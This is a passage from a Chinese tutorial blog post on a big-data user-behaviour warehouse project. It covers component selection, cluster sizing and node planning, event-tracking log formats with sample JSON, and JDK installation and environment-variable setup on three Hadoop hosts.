不用</li><li>数据查询：<strong>Presto</strong>,<strong>Kylin</strong>（Apache）,Impala,Druid</li><li>数据可视化：Echarts（百度的，现在已经是Apache的了）,<strong>Superset</strong>（开源）,QuickBI,DataV（后两个都是阿里）</li><li>任务调度：<strong>Azkaban</strong>(Apache的，可视化界面),Oozie（CDH生态，HUE，功能比azkaban强大）</li><li>集群监控：<strong>Zabbix</strong></li><li>元数据管理：<strong>Atlas</strong></li></ul><h3 id="2-2-2-系统数据流程设计"><a href="#2-2-2-系统数据流程设计" class="headerlink" title="2.2.2 系统数据流程设计"></a>2.2.2 系统数据流程设计</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637652372079.png" alt="1637652372079"></p><p>多个Flume往HDFS中写数据，会有压力，因此中间部署Kafka，来缓冲。</p><p>Hive通过写sql对数据进行处理，主要有5层处理，分别是ods,dwd,dws,dwt,ads。</p><p>对整个仓库的任务：利用什么时候导入数据等用Azkaban来调度。</p><h3 id="2-2-3-框架版本选型"><a href="#2-2-3-框架版本选型" class="headerlink" title="2.2.3 框架版本选型"></a>2.2.3 框架版本选型</h3><p>  1）如何选择Apache/CDH/HDP版本？</p><p>Apache：运维麻烦；组件间兼容性需要自己调研（一般大厂使用，技术实力雄厚，有专业的运维人员）</p><p>CDH：国内使用最多的版本，但是CM不开源。2021年开始收费，一个节点1万美金</p><p>HDP：开源，可以进行二次开发，但是没有CDH稳定，国内使用较少</p><p>  目前CDH和HDP已经合并了。</p><p>2）框架版本参考</p><table><thead><tr><th>产品</th><th>版本</th></tr></thead><tbody><tr><td>Hadoop</td><td>3.1.3</td></tr><tr><td>Flume</td><td>1.9.0</td></tr><tr><td>Kafka</td><td>2.4.1</td></tr><tr><td>Hive</td><td>3.1.2</td></tr><tr><td>Sqoop</td><td>1.4.6</td></tr><tr><td>Java</td><td>1.8</td></tr><tr><td>Zookeeper</td><td>3.5.7</td></tr><tr><td>Presto</td><td>0.189</td></tr></tbody></table><h3 id="2-2-4-服务器选型"><a href="#2-2-4-服务器选型" class="headerlink" title="2.2.4   服务器选型"></a>2.2.4   服务器选型</h3><p>  服务器选择物理机还是云主机？</p><p>1）物理机：</p><p>以128G内存，20核物理CPU，40线程，戴尔品牌单台报价4W出头，一般物理机寿命5年左右。</p><p>需要有专业的运维任意，平均一个月1万。电费也是不少的开销。</p><p>2）云主机：</p><p>以阿里云为例，差不多配置，每年5W。运维工作都有阿里云完成，运维相对较轻松。</p><p>3）企业选择</p><p>金融有限公司和阿里没有直接冲突的公司选择阿里云。</p><p>中小公司，为了融资上市，选择阿里云，拉到融资后买物理机。</p><p>有长期打算，资金比较足，选择物理机。</p><h3 id="2-2-5-集群资源规划设计"><a href="#2-2-5-集群资源规划设计" class="headerlink" title="2.2.5 集群资源规划设计"></a>2.2.5 集群资源规划设计</h3><p>1）如何确认集群规模？（假设服务器8T磁盘，128G内存）</p><p>（1）每天日活跃用户100万，每人一天平均100条：100万*100条=1亿条</p><p>（2）每条日志1k左右，每天1亿条：100000000/1024/1024=约100G</p><p>（3）半年内不扩容服务器来算：100G*180天=约18T</p><p>（4）保留3副本：18T*3=54T</p><p>（5）保留20%-30%buf=54T/0.7=77T</p><p>（6）算到这里：约8T*10台服务器</p><p>2）测试集群服务器规划</p><table><thead><tr><th>服务名称</th><th>子服务</th><th>服务器  hadoop102</th><th>服务器  hadoop103</th><th>服务器  hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>√</td><td></td><td></td></tr><tr><td></td><td>DataNode</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>SecondaryNameNode</td><td></td><td></td><td>√</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>Resourcemanager</td><td></td><td>√</td><td></td></tr><tr><td>Zookeeper</td><td>Zookeeper Server</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume(采集日志)</td><td>Flume</td><td>√</td><td>√</td><td></td></tr><tr><td>Kafka</td><td>Kafka</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume（消费Kafka）</td><td>Flume</td><td></td><td></td><td>√</td></tr><tr><td>Hive</td><td>Hive</td><td>√</td><td></td><td></td></tr><tr><td>MySQL</td><td>MySQL</td><td>√</td><td></td><td></td></tr><tr><td>Sqoop</td><td>Sqoop</td><td>√</td><td></td><td></td></tr><tr><td>Presto</td><td>Coordinator</td><td>√</td><td></td><td></td></tr><tr><td></td><td>Worker</td><td></td><td>√</td><td>√</td></tr><tr><td>Azkaban</td><td>AzkabanWebServer</td><td>√</td><td></td><td></td></tr><tr><td></td><td>AzkabanExecutorServer</td><td>√</td><td></td><td></td></tr><tr><td>Druid</td><td>Druid</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Kylin</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Hbase</td><td>HMaster</td><td>√</td><td></td><td></td></tr><tr><td></td><td>HRegionServer</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Superset</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Atlas</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Solr</td><td>Jar</td><td>√</td><td></td><td></td></tr><tr><td>服务数总计</td><td></td><td>18</td><td>9</td><td>9</td></tr></tbody></table><h1 id="3-数据生成模块"><a href="#3-数据生成模块" class="headerlink" title="3 数据生成模块"></a>3 数据生成模块</h1><h2 id="3-1-目标数据"><a href="#3-1-目标数据" class="headerlink" title="3.1 目标数据"></a>3.1 目标数据</h2><p>我们要收集和分析的数据主要包括页面数据、事件数据、曝光数据、启动数据和错误数据。</p><h3 id="3-1-1-页面"><a href="#3-1-1-页面" class="headerlink" title="3.1.1 页面"></a>3.1.1 页面</h3><p>页面数据主要记录一个页面的用户访问情况，包括访问时间、停留时间、页面路径等信息。</p><p>​              </p><p>1）所有页面id如下</p><pre class="line-numbers language-bash"><code class="language-bash">home<span class="token punctuation">(</span><span class="token string">"首页"</span><span class="token punctuation">)</span>,category<span class="token punctuation">(</span><span class="token string">"分类页"</span><span class="token punctuation">)</span>,discovery<span class="token punctuation">(</span><span class="token string">"发现页"</span><span class="token punctuation">)</span>,top_n<span class="token punctuation">(</span><span class="token string">"热门排行"</span><span class="token punctuation">)</span>,favor<span class="token punctuation">(</span><span class="token string">"收藏页"</span><span class="token punctuation">)</span>,search<span class="token punctuation">(</span><span class="token string">"搜索页"</span><span class="token punctuation">)</span>,good_list<span class="token punctuation">(</span><span class="token string">"商品列表页"</span><span class="token punctuation">)</span>,good_detail<span class="token punctuation">(</span><span class="token string">"商品详情"</span><span class="token punctuation">)</span>,good_spec<span class="token punctuation">(</span><span class="token string">"商品规格"</span><span class="token punctuation">)</span>,comment<span class="token punctuation">(</span><span class="token string">"评价"</span><span class="token punctuation">)</span>,comment_done<span class="token punctuation">(</span><span class="token string">"评价完成"</span><span class="token punctuation">)</span>,comment_list<span class="token punctuation">(</span><span class="token string">"评价列表"</span><span class="token punctuation">)</span>,cart<span class="token punctuation">(</span><span class="token string">"购物车"</span><span class="token punctuation">)</span>,trade<span class="token punctuation">(</span><span class="token string">"下单结算"</span><span class="token punctuation">)</span>,payment<span class="token punctuation">(</span><span class="token string">"支付页面"</span><span class="token punctuation">)</span>,payment_done<span class="token punctuation">(</span><span class="token string">"支付完成"</span><span class="token punctuation">)</span>,orders_all<span class="token punctuation">(</span><span class="token string">"全部订单"</span><span class="token punctuation">)</span>,orders_unpaid<span class="token punctuation">(</span><span class="token string">"订单待支付"</span><span class="token punctuation">)</span>,orders_undelivered<span class="token punctuation">(</span><span class="token string">"订单待发货"</span><span class="token punctuation">)</span>,orders_unreceipted<span class="token punctuation">(</span><span class="token string">"订单待收货"</span><span class="token punctuation">)</span>,orders_wait_comment<span class="token punctuation">(</span><span class="token string">"订单待评价"</span><span class="token punctuation">)</span>,mine<span class="token punctuation">(</span><span class="token string">"我的"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"活动"</span><span class="token punctuation">)</span>,login<span class="token punctuation">(</span><span class="token string">"登录"</span><span class="token punctuation">)</span>,register<span class="token punctuation">(</span><span class="token string">"注册"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）所有页面对象类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sku_id<span class="token punctuation">(</span><span class="token string">"商品skuId"</span><span class="token punctuation">)</span>,keyword<span class="token punctuation">(</span><span class="token string">"搜索关键词"</span><span class="token punctuation">)</span>,sku_ids<span class="token punctuation">(</span><span class="token string">"多个商品skuId"</span><span class="token punctuation">)</span>,activity_id<span class="token punctuation">(</span><span class="token string">"活动id"</span><span class="token punctuation">)</span>,coupon_id<span class="token punctuation">(</span><span class="token string">"购物券id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）所有来源类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">promotion<span class="token punctuation">(</span><span class="token string">"商品推广"</span><span class="token punctuation">)</span>,recommend<span class="token punctuation">(</span><span class="token string">"算法推荐商品"</span><span class="token punctuation">)</span>,query<span class="token punctuation">(</span><span class="token string">"查询结果商品"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"促销活动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-事件"><a href="#3-1-2-事件" class="headerlink" title="3.1.2 事件"></a>3.1.2 事件</h3><p>事件数据主要记录应用内一个具体操作行为，包括操作类型、操作对象、操作对象描述等信息。</p><p>1）所有动作类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">favor_add<span class="token punctuation">(</span><span class="token string">"添加收藏"</span><span class="token punctuation">)</span>,favor_canel<span class="token punctuation">(</span><span class="token string">"取消收藏"</span><span class="token punctuation">)</span>,cart_add<span class="token punctuation">(</span><span class="token string">"添加购物车"</span><span class="token punctuation">)</span>,cart_remove<span class="token punctuation">(</span><span class="token string">"删除购物车"</span><span class="token punctuation">)</span>,cart_add_num<span class="token punctuation">(</span><span class="token string">"增加购物车商品数量"</span><span class="token punctuation">)</span>,cart_minus_num<span class="token punctuation">(</span><span class="token string">"减少购物车商品数量"</span><span class="token punctuation">)</span>,trade_add_address<span class="token punctuation">(</span><span class="token string">"增加收货地址"</span><span class="token punctuation">)</span>,get_coupon<span class="token punctuation">(</span><span class="token string">"领取优惠券"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：对于下单、支付等业务数据，可从业务数据库获取。</p><p>2）所有动作目标类型如下：</p><p>sku_id(“商品”),<br>coupon_id(“购物券”);</p><h3 id="3-1-3-曝光"><a href="#3-1-3-曝光" class="headerlink" title="3.1.3 曝光"></a>3.1.3 曝光</h3><p>曝光数据主要记录页面所曝光的内容，包括曝光对象，曝光类型等信息。</p><p>1）所有曝光类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">promotion<span class="token punctuation">(</span><span class="token string">"商品推广"</span><span class="token punctuation">)</span>,recommend<span class="token punctuation">(</span><span class="token string">"算法推荐商品"</span><span class="token punctuation">)</span>,query<span class="token punctuation">(</span><span class="token string">"查询结果商品"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"促销活动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）所有曝光对象类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sku_id<span class="token punctuation">(</span><span class="token string">"商品skuId"</span><span class="token punctuation">)</span>,activity_id<span class="token punctuation">(</span><span class="token string">"活动id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-1-4-启动"><a href="#3-1-4-启动" class="headerlink" title="3.1.4 启动"></a>3.1.4 启动</h3><p>启动数据记录应用的启动信息。</p><p>1）所有启动入口类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">icon<span class="token punctuation">(</span><span class="token string">"图标"</span><span class="token punctuation">)</span>,notification<span class="token punctuation">(</span><span class="token string">"通知"</span><span class="token punctuation">)</span>,install<span class="token punctuation">(</span><span class="token string">"安装后启动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-1-5-错误"><a href="#3-1-5-错误" class="headerlink" title="3.1.5 错误"></a>3.1.5 错误</h3><p>错误数据记录应用使用过程中的错误信息，包括错误编号及错误信息。</p><h2 id="3-2-数据埋点"><a href="#3-2-数据埋点" class="headerlink" title="3.2 数据埋点"></a>3.2 数据埋点</h2><h3 id="3-2-1-主流埋点方式（了解）"><a href="#3-2-1-主流埋点方式（了解）" class="headerlink" title="3.2.1 主流埋点方式（了解）"></a>3.2.1 主流埋点方式（了解）</h3><p>目前主流的埋点方式，有代码埋点（前端/后端）、可视化埋点、全埋点三种。</p><p>代码埋点是通过调用埋点SDK函数，在需要埋点的业务逻辑功能位置调用接口，上报埋点数据。例如，我们对页面中的某个按钮埋点后，当这个按钮被点击时，可以在这个按钮对应的 OnClick 函数里面调用SDK提供的数据发送接口，来发送数据。</p><p>可视化埋点只需要研发人员集成采集 SDK，不需要写埋点代码，业务人员就可以通过访问分析平台的“圈选”功能，来“圈”出需要对用户行为进行捕捉的控件，并对该事件进行命名。圈选完毕后，这些配置会同步到各个用户的终端上，由采集 SDK 按照圈选的配置自动进行用户行为数据的采集和发送。（三方埋点技术：神策大数据，GrowingIO）</p><p>全埋点是通过在产品中嵌入SDK，前端自动采集页面上的全部用户行为事件，上报埋点数据，相当于做了一个统一的埋点。然后再通过界面配置哪些数据需要在系统里面进行分析。</p><h3 id="3-2-2-埋点数据日志结构"><a href="#3-2-2-埋点数据日志结构" class="headerlink" title="3.2.2 埋点数据日志结构"></a>3.2.2 埋点数据日志结构</h3><p>我们的日志结构大致可分为两类，一是普通页面埋点日志，二是启动日志。</p><p>普通页面日志结构如下，每条日志包含了，当前页面的页面信息，所有事件（动作）、所有曝光信息以及错误信息。除此之外，还包含了一系列<strong>公共信息</strong>，包括设备信息，地理位置，应用信息等，即下边的<strong>common</strong>字段。</p><p>1）普通页面埋点日志格式</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"common"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>                  -- 公共信息    <span class="token property">"ar"</span><span class="token operator">:</span> <span class="token string">"230000"</span><span class="token punctuation">,</span>              -- 地区编码    <span class="token property">"ba"</span><span class="token operator">:</span> <span class="token string">"iPhone"</span><span class="token punctuation">,</span>              -- 手机品牌    <span class="token property">"ch"</span><span class="token operator">:</span> <span class="token string">"Appstore"</span><span class="token punctuation">,</span>            -- 渠道    <span class="token property">"is_new"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>--是否首日使用，首次使用的当日，该字段值为<span class="token number">1</span>，过了<span class="token number">24</span><span class="token operator">:</span><span class="token number">00</span>，该字段置为<span class="token number">0</span>。    <span class="token property">"md"</span><span class="token operator">:</span> <span class="token string">"iPhone 8"</span><span class="token punctuation">,</span>            -- 手机型号    <span class="token property">"mid"</span><span class="token operator">:</span> <span class="token string">"YXfhjAYH6As2z9Iq"</span><span class="token punctuation">,</span> -- 设备id    <span class="token property">"os"</span><span class="token operator">:</span> <span class="token string">"iOS 13.2.9"</span><span class="token punctuation">,</span>          -- 操作系统    <span class="token property">"uid"</span><span class="token operator">:</span> <span class="token string">"485"</span><span class="token punctuation">,</span>                 -- 会员id    <span class="token property">"vc"</span><span class="token operator">:</span> <span class="token string">"v2.1.134"</span>             -- app版本号  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"actions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                     --动作(事件<span class="token punctuation">)</span>      &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"action_id"</span><span class="token operator">:</span> <span class="token string">"favor_add"</span><span class="token punctuation">,</span>   --动作id      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                   --目标id      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>       --目标类型      <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744376605</span>           --动作时间戳    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"displays"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>        -- 曝光类型      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                     -- 曝光对象id      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>         -- 曝光对象类型      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                      --出现顺序      <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">2</span>                      --曝光位置    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">1</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">3</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"recommend"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">2</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"query "</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">1</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"page"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>                       --页面信息    <span class="token property">"during_time"</span><span class="token operator">:</span> <span class="token number">7648</span><span class="token punctuation">,</span>        -- 持续时间毫秒    <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                  -- 目标id    <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      -- 目标类型    <span class="token property">"last_page_id"</span><span class="token operator">:</span> <span class="token string">"login"</span><span class="token punctuation">,</span>    -- 上页类型    <span class="token property">"page_id"</span><span class="token operator">:</span> <span class="token string">"good_detail"</span><span class="token punctuation">,</span>   -- 页面ID    <span class="token property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span>   -- 来源类型  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"err"</span><span class="token operator">:</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>                     --错误<span class="token property">"error_code"</span><span class="token operator">:</span> <span class="token string">"1234"</span><span class="token punctuation">,</span>      --错误码    <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"***********"</span>       --错误信息&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744374423</span>  --跳入时间戳&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 2）启动日志格式</p><p>启动日志结构相对简单，主要包含公共信息，启动信息和错误信息。</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"common"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"ar"</span><span class="token operator">:</span> <span class="token string">"370000"</span><span class="token punctuation">,</span>    <span class="token property">"ba"</span><span class="token operator">:</span> <span class="token string">"Honor"</span><span class="token punctuation">,</span>    <span class="token property">"ch"</span><span class="token operator">:</span> <span class="token string">"wandoujia"</span><span class="token punctuation">,</span>    <span class="token property">"is_new"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>    <span class="token property">"md"</span><span class="token operator">:</span> <span class="token string">"Honor 20s"</span><span class="token punctuation">,</span>    <span class="token property">"mid"</span><span class="token operator">:</span> <span class="token string">"eQF5boERMJFOujcp"</span><span class="token punctuation">,</span>    <span class="token property">"os"</span><span class="token operator">:</span> <span class="token string">"Android 11.0"</span><span class="token punctuation">,</span>    <span class="token property">"uid"</span><span class="token operator">:</span> <span class="token string">"76"</span><span class="token punctuation">,</span>    <span class="token property">"vc"</span><span class="token operator">:</span> <span class="token string">"v2.1.134"</span>  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"start"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>       <span class="token property">"entry"</span><span class="token operator">:</span> <span class="token string">"icon"</span><span class="token punctuation">,</span>         --icon手机图标  notice 通知   install 安装后启动    <span class="token property">"loading_time"</span><span class="token operator">:</span> <span class="token number">18803</span><span class="token punctuation">,</span>  --启动加载时间    <span class="token property">"open_ad_id"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span>        --广告页ID    <span class="token property">"open_ad_ms"</span><span class="token operator">:</span> <span class="token number">3449</span><span class="token punctuation">,</span>    -- 广告总共播放时间    <span class="token property">"open_ad_skip_ms"</span><span class="token operator">:</span> <span class="token number">1989</span>   --  用户跳过广告时点  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"err"</span><span class="token operator">:</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>                     --错误<span class="token property">"error_code"</span><span class="token operator">:</span> <span class="token string">"1234"</span><span class="token punctuation">,</span>      --错误码    <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"***********"</span>       --错误信息&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744304000</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-3-埋点数据上报时机"><a href="#3-2-3-埋点数据上报时机" class="headerlink" title="3.2.3 埋点数据上报时机"></a>3.2.3 埋点数据上报时机</h3><p>埋点数据上报时机包括两种方式。</p><p>方式一，在离开该页面时，上传在这个页面产生的所有数据（页面、事件、曝光、错误等）。优点，批处理，减少了服务器接收数据压力。缺点，不是特别及时。</p><p>方式二，每个事件、动作、错误等，产生后，立即发送。优点，响应及时。缺点，对服务器接收数据压力比较大。</p><h2 id="3-3-服务器和JDK准备"><a href="#3-3-服务器和JDK准备" class="headerlink" title="3.3 服务器和JDK准备"></a>3.3 服务器和JDK准备</h2><h3 id="3-3-1-服务器准备"><a href="#3-3-1-服务器准备" class="headerlink" title="3.3.1 服务器准备"></a>3.3.1 服务器准备</h3><p>安装hadoop集群，分别安装hadoop102、hadoop103、hadoop104三台主机。</p><h3 id="3-3-2-阿里云服务器准备（可选）"><a href="#3-3-2-阿里云服务器准备（可选）" class="headerlink" title="3.3.2 阿里云服务器准备（可选）"></a>3.3.2 阿里云服务器准备（可选）</h3><h3 id="3-3-3-JDK准备"><a href="#3-3-3-JDK准备" class="headerlink" title="3.3.3 JDK准备"></a>3.3.3 JDK准备</h3><p>1）卸载现有JDK（3台节点）</p><pre><code>[molly@hadoop102 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps[molly@hadoop103 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps[molly@hadoop104 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps</code></pre><p>2）用SecureCRT工具将JDK导入到hadoop102的/opt/software文件夹下面</p><p>3） “alt+p”进入sftp模式   </p><p>4）选择jdk1.8拖入工具</p><p>5）在Linux系统下的opt目录中查看软件包是否导入成功</p><pre><code>[molly@hadoop102 software]# ls /opt/software/</code></pre><p>看到如下结果：</p><pre><code>jdk-8u212-linux-x64.tar.gz</code></pre><p>6）解压JDK到/opt/module目录下</p><pre><code>[molly@hadoop102 software]# tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</code></pre><p>7）配置JDK环境变量</p><p>​    （1）新建/etc/profile.d/my_env.sh文件</p><pre><code>[molly@hadoop102 module]# sudo vim /etc/profile.d/my_env.sh</code></pre><p>添加如下内容，然后保存（:wq）退出</p><pre class="line-numbers language-sh"><code class="language-sh">#JAVA_HOMEexport JAVA_HOME=/opt/module/jdk1.8.0_212export PATH=$PATH:$JAVA_HOME/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​    （2）让环境变量生效</p><pre><code>[molly@hadoop102 software]$ source /etc/profile.d/my_env.sh</code></pre><p>8）测试JDK是否安装成功</p><pre><code>[molly@hadoop102 module]# java -version#如果能看到以下结果、则Java正常安装java version &quot;1.8.0_212&quot;</code></pre><p>9）分发JDK </p><pre><code>[molly@hadoop102 module]$ xsync /opt/module/jdk1.8.0_212/</code></pre><p>10）分发环境变量配置文件</p><pre><code>[molly@hadoop102 module]$ sudo /home/molly/bin/xsync /etc/profile.d/my_env.sh</code></pre><p>11）分别在hadoop103、hadoop104上执行source</p><pre><code>[molly@hadoop103 module]$ source /etc/profile.d/my_env.sh[molly@hadoop104 module]$ source /etc/profile.d/my_env.sh</code></pre><h3 id="3-3-4-环境变量配置说明"><a href="#3-3-4-环境变量配置说明" class="headerlink" title="3.3.4 环境变量配置说明"></a>3.3.4 环境变量配置说明</h3><p>Linux的环境变量可在多个文件中配置，如/etc/profile，/etc/profile.d/*.sh，<del>/.bashrc，</del>/.bash_profile等，下面说明上述几个文件之间的关系和区别。</p><p>bash的运行模式可分为login shell和non-login shell。</p><p>例如，我们通过终端，输入用户名、密码，登录系统之后，得到就是一个login shell，而当我们执行以下命令ssh hadoop103 command，在hadoop103执行command的就是一个non-login shell。</p><p>这两种shell的主要区别在于，它们启动时会加载不同的配置文件，login shell启动时会加载/etc/profile，<del>/.bash_profile，</del>/.bashrc，non-login shell启动时会加载~/.bashrc。</p><p>而在加载<del>/.bashrc（实际是</del>/.bashrc中加载的/etc/bashrc）或/etc/profile时，都会执行如下代码片段，</p><p>​      <img 